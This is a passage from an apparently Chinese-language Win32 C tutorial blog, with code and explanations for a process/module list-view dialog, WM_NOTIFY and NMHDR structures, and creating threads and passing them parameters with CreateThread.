class=\"line\">\tlv.iSubItem = <span class=\"number\">1</span>;</span><br><span class=\"line\">\tlv.pszText = szPid;</span><br><span class=\"line\">\tlv.cchTextMax = <span class=\"number\">0x20</span>;</span><br><span class=\"line\">\tSendMessage(hListProcess,LVM_GETITEMTEXT,dwRowId,(DWORD)&amp;lv);</span><br><span class=\"line\">\tMessageBox(<span class=\"literal\">NULL</span>,szPid,TEXT(<span class=\"string\">&quot;PID&quot;</span>),MB_OK);</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">InitProcessListView</span><span class=\"params\">(HWND hDlg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tLV_COLUMN lv;\t\t\t\t\t</span><br><span class=\"line\">\tHWND hListProcess;\t\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//初始化\t\t\t\t\t</span></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(&amp;lv,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(LV_COLUMN));\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//获取IDC_LIST_PROCESS句柄\t\t\t\t\t</span></span><br><span class=\"line\">\thListProcess = GetDlgItem(hDlg,IDC_LIST_PROCESS);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//设置整行选中\t\t\t\t\t</span></span><br><span class=\"line\">\tSendMessage(hListProcess,LVM_SETEXTENDEDLISTVIEWSTYLE,LVS_EX_FULLROWSELECT,LVS_EX_FULLROWSELECT);\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//第一列\t\t\t\t\t</span></span><br><span class=\"line\">\tlv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\t\t\t\t\t</span><br><span class=\"line\">\tlv.pszText = TEXT(<span class=\"string\">&quot;进程&quot;</span>);\t\t\t\t<span class=\"comment\">//列标题\t</span></span><br><span class=\"line\">\tlv.cx = <span class=\"number\">130</span>;\t\t\t\t\t</span><br><span class=\"line\">\tlv.iSubItem = <span class=\"number\">0</span>;\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//ListView_InsertColumn(hListProcess, 0, &amp;lv);\t\t\t\t\t</span></span><br><span class=\"line\">\tSendMessage(hListProcess,LVM_INSERTCOLUMN,<span class=\"number\">0</span>,(DWORD)&amp;lv);\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//第二列\t\t\t\t\t</span></span><br><span class=\"line\">\tlv.pszText = TEXT(<span class=\"string\">&quot;PID&quot;</span>);\t\t\t\t\t</span><br><span class=\"line\">\tlv.cx = <span class=\"number\">60</span>;\t\t\t\t\t</span><br><span class=\"line\">\tlv.iSubItem = <span class=\"number\">1</span>;\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//ListView_InsertColumn(hListProcess, 1, &amp;lv);\t\t\t\t\t</span></span><br><span class=\"line\">\tSendMessage(hListProcess,LVM_INSERTCOLUMN,<span class=\"number\">1</span>,(DWORD)&amp;lv);\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//第三列\t\t\t\t\t</span></span><br><span class=\"line\">\tlv.pszText = TEXT(<span class=\"string\">&quot;镜像基址&quot;</span>);\t\t\t\t\t</span><br><span class=\"line\">\tlv.cx = <span class=\"number\">100</span>;\t\t\t\t\t</span><br><span class=\"line\">\tlv.iSubItem = <span class=\"number\">2</span>;\t\t\t\t\t</span><br><span class=\"line\">\tListView_InsertColumn(hListProcess, <span class=\"number\">2</span>, &amp;lv);\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//第四列\t\t\t\t\t</span></span><br><span class=\"line\">\tlv.pszText = TEXT(<span class=\"string\">&quot;镜像大小&quot;</span>);\t\t\t\t\t</span><br><span class=\"line\">\tlv.cx = <span class=\"number\">120</span>;\t\t\t\t\t</span><br><span class=\"line\">\tlv.iSubItem = <span class=\"number\">3</span>;\t\t\t\t\t</span><br><span class=\"line\">\tListView_InsertColumn(hListProcess, <span class=\"number\">3</span>, &amp;lv);</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tEnumProccess(hListProcess);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">InitModuleListView</span><span class=\"params\">(HWND hDlg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tLV_COLUMN lv1;\t\t\t\t\t</span><br><span class=\"line\">\tHWND hListProcess1;\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(&amp;lv1,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(LV_COLUMN));</span><br><span class=\"line\">\thListProcess1 = GetDlgItem(hDlg,IDC_LIST_MOUDLE);</span><br><span class=\"line\">\tSendMessage(hListProcess1,LVM_SETEXTENDEDLISTVIEWSTYLE,LVS_EX_FULLROWSELECT,LVS_EX_FULLROWSELECT);\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">//第一列\t\t\t\t\t</span></span><br><span class=\"line\">\tlv1.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;\t\t\t\t\t</span><br><span class=\"line\">\tlv1.pszText = TEXT(<span class=\"string\">&quot;模块名称&quot;</span>);\t\t\t\t<span class=\"comment\">//列标题\t</span></span><br><span class=\"line\">\tlv1.cx = <span class=\"number\">200</span>;\t\t\t\t\t</span><br><span class=\"line\">\tlv1.iSubItem = <span class=\"number\">0</span>;\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//ListView_InsertColumn(hListProcess, 0, &amp;lv);\t\t\t\t\t</span></span><br><span class=\"line\">\tSendMessage(hListProcess1,LVM_INSERTCOLUMN,<span class=\"number\">0</span>,(DWORD)&amp;lv1);\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//第二列\t\t\t\t\t</span></span><br><span class=\"line\">\tlv1.pszText = TEXT(<span class=\"string\">&quot;模块位置&quot;</span>);\t\t\t\t\t</span><br><span class=\"line\">\tlv1.cx = <span class=\"number\">210</span>;\t\t\t\t\t</span><br><span class=\"line\">\tlv1.iSubItem = <span class=\"number\">1</span>;\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//ListView_InsertColumn(hListProcess, 1, &amp;lv);\t\t\t\t\t</span></span><br><span class=\"line\">\tSendMessage(hListProcess1,LVM_INSERTCOLUMN,<span class=\"number\">1</span>,(DWORD)&amp;lv1);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tEnumProccess(hListProcess1);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL CALLBACK <span class=\"title function_\">DialogProc</span><span class=\"params\">(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (uMsg)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> WM_CLOSE:</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tEndDialog(hDlg,<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> WM_INITDIALOG:</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tInitProcessListView(hDlg);\t</span><br><span class=\"line\">\t\t\tInitModuleListView(hDlg);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> WM_NOTIFY:</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tNMHDR* pNMHDR = (NMHDR*)lParam;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(wParam == IDC_LIST_PROCESS &amp;&amp; pNMHDR-&gt;code == NM_CLICK)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tEnumModules(GetDlgItem(hDlg,IDC_LIST_PROCESS),wParam,lParam);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> WM_COMMAND:</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">switch</span>(LOWORD(wParam))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> IDC_BUTTON_PE:</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> IDC_BUTTON_ABOUT:</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">case</span> IDC_BUTTON_LOGOUT:</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t<span class=\"comment\">//处理当前程序不关心的消息类型</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> FALSE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> APIENTRY <span class=\"title function_\">WinMain</span><span class=\"params\">(HINSTANCE hInstance,</span></span><br><span class=\"line\"><span class=\"params\">                     HINSTANCE hPrevInstance,</span></span><br><span class=\"line\"><span class=\"params\">                     LPSTR     lpCmdLine,</span></span><br><span class=\"line\"><span class=\"params\">                     <span class=\"type\">int</span>       nCmdShow)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> \t<span class=\"comment\">// <span class=\"doctag\">TODO:</span> Place code here.</span></span><br><span class=\"line\">\tINITCOMMONCONTROLSEX icex;\t\t\t\t</span><br><span class=\"line\">\ticex.dwSize = <span class=\"keyword\">sizeof</span>(INITCOMMONCONTROLSEX);\t\t\t\t</span><br><span class=\"line\">\ticex.dwICC = ICC_WIN95_CLASSES;\t\t\t\t</span><br><span class=\"line\">\tInitCommonControlsEx(&amp;icex);\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\tDialogBox(hInstance,MAKEINTRESOURCE(IDD_DIALOG_MAIN),<span class=\"literal\">NULL</span>,DialogProc);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>WM_NOTIFY</p>\n<p>该消息类型与 WM_COMMAND 类型相似，都是由子窗口向父窗口发送的消息。</p>\n<p>WM_NOTIFY 可以包含比 WM_COMMAND 更丰富的信息</p>\n<p>Windows 通用组件中有很多消息，都是通过 WM_NOTIFY 来描述的.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">WM_NOTIFY消息中的参数如下：\t\t\t\t</span><br><span class=\"line\">wParam:控件ID\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">lParam:指向一个结构tagNMHDR\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tagNMHDR</span> &#123;</span> \t\t\t\t\t</span><br><span class=\"line\">        HWND hwndFrom; <span class=\"comment\">//发送通知消息的控制窗口句柄\t\t\t\t\t</span></span><br><span class=\"line\">        UINT idFrom;   <span class=\"comment\">//发送通知消息的控制ID值\t\t\t\t\t</span></span><br><span class=\"line\">        UINT code;     <span class=\"comment\">//通知码，如LVM_SELCHANGED\t\t\t\t\t</span></span><br><span class=\"line\">    &#125; NMHDR; \t\t\t\t\t</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这个结构体能满足一般的要求，但能描述的信息还是有限的\t\t\t\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">解决方案：对每种不同用途的通知消息都定义另一种结构来表示\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tagNMLVCACHEHINT</span> &#123;</span>\t\t\t\t</span><br><span class=\"line\">    NMHDR   hdr;\t\t\t\t</span><br><span class=\"line\">    <span class=\"type\">int</span>     iFrom;\t\t\t\t</span><br><span class=\"line\">    <span class=\"type\">int</span>     iTo;\t\t\t\t</span><br><span class=\"line\">&#125; NMLVCACHEHINT, *PNMLVCACHEHINT;\t\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tagLVDISPINFO</span> &#123;</span>\t\t\t\t</span><br><span class=\"line\">    NMHDR hdr;\t\t\t\t</span><br><span class=\"line\">    LVITEM item;\t\t\t\t</span><br><span class=\"line\">&#125; NMLVDISPINFO, FAR *LPNMLVDISPINFO;\t\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">NMLVFINDITEM</span> &#123;</span>\t\t\t\t</span><br><span class=\"line\">    NMHDR hdr;\t\t\t\t</span><br><span class=\"line\">    <span class=\"type\">int</span> iStart;\t\t\t\t</span><br><span class=\"line\">    LVFINDINFO lvfi;\t\t\t\t</span><br><span class=\"line\">&#125; NMLVFINDITEM, *PNMLVFINDITEM;\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">以上三个结构体都继承了tagNMHDR</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230701220743398.png\" alt=\"image-20230701220743398\"></p>\n<h3 id=\"创建线程\"><a class=\"markdownIt-Anchor\" href=\"#创建线程\">#</a> 创建线程</h3>\n<p>一个进程中至少有一个线程。</p>\n<p>多线程会产生多个堆栈，每个线程都有自己的栈的空间</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HANDLE hThread = ::CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ThreadProc, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">HANDLE <span class=\"title function_\">CreateThread</span><span class=\"params\">(\t\t\t\t</span></span><br><span class=\"line\"><span class=\"params\">  LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class=\"comment\">// 安全属性 通常为NULL\t\t\t\t</span></span></span><br><span class=\"line\"><span class=\"params\">  SIZE_T dwStackSize,                       <span class=\"comment\">// 参数用于设定线程可以将多少地址空间用于它自己的堆栈\t\t\t\t</span></span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t        \t\t\t\t <span class=\"comment\">// 每个线程拥有它自己的堆栈</span></span></span><br><span class=\"line\"><span class=\"params\">  LPTHREAD_START_ROUTINE lpStartAddress,    <span class=\"comment\">// 参数用于指明想要新线程执行的线程函数的地址，并不是立即执行，取决于cpu\t\t\t\t</span></span></span><br><span class=\"line\"><span class=\"params\">  LPVOID lpParameter,                       <span class=\"comment\">// 线程函数的参数\t\t\t\t</span></span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t        \t\t\t\t <span class=\"comment\">// 在线程启动执行时将该参数传递给线程函数</span></span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t        \t\t\t\t <span class=\"comment\">// 既可以是数字，也可以是指向包含其他信息的一个数据结构的指针</span></span></span><br><span class=\"line\"><span class=\"params\">  DWORD dwCreationFlags,                    <span class=\"comment\">// 0 创建完毕立即调度  CREATE_SUSPENDED创建后挂起\t\t\t\t</span></span></span><br><span class=\"line\"><span class=\"params\">  OUT LPDWORD lpThreadId                    <span class=\"comment\">// 线程ID \t\t\t\t</span></span></span><br><span class=\"line\"><span class=\"params\">)</span>;\t\t\t\t</span><br><span class=\"line\">\t\t\t\t        \t\t\t\t <span class=\"comment\">// 返回值：线程句柄</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadProc</span><span class=\"params\">(LPVOID lpParameter)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">1000</span>; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">//Sleep(1000);</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;----------\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">MyTest</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    HANDLE hThread = ::CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ThreadProc, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    ::CloseHandle(hThread);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tMyTest();</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">1000</span>;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tSleep(<span class=\"number\">1000</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;++++++++++\\n&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230815185107177.png\" alt=\"image-20230815185107177\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230815185142573.png\" alt=\"image-20230815185142573\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">线程句柄与线程ID:\t\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">线程是由Windows内核负责创建与管理的，句柄相当于一个令牌，有了这个令牌就可以使用线程对象.\t\t\t\t</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">线程ID是身份证，唯一的，系统进行线程调度的时候要使用的.\t\t\t</span><br></pre></td></tr></table></figure>\n<p>::CreateThread 代表是一个全局的函数</p>\n<p>::CloseHandle 当前句柄释放，线程还在运行</p>\n<h4 id=\"线程传参\"><a class=\"markdownIt-Anchor\" href=\"#线程传参\">#</a> 线程传参</h4>\n<p>全局变量</p>\n<p>线程参数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadProc</span><span class=\"params\">(LPVOID lpParameter)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> x = (<span class=\"type\">int</span>)lpParameter</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">1000</span>; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">//Sleep(1000);</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;-----%d-----\\n&quot;</span>,x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">MyTest</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> x = <span class=\"number\">2</span>;</span><br><span class=\"line\">    HANDLE hThread = ::CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ThreadProc, (<span class=\"type\">void</span>*)x, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    ::CloseHandle(hThread);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DWORD WINAPI <span class=\"title function_\">ThreadProc</span><span class=\"params\">(LPVOID lpParameter)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span>* x = (<span class=\"type\">int</span> *)lpParameter</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">1000</span>; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">//Sleep(1000);</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;-----%d-----\\n&quot;</span>,*x);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> x = <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">MyTest</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    HANDLE hThread = ::CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ThreadProc, (<span class=\"type\">void</span>*)&amp;x, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    ::CloseHandle(hThread);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span 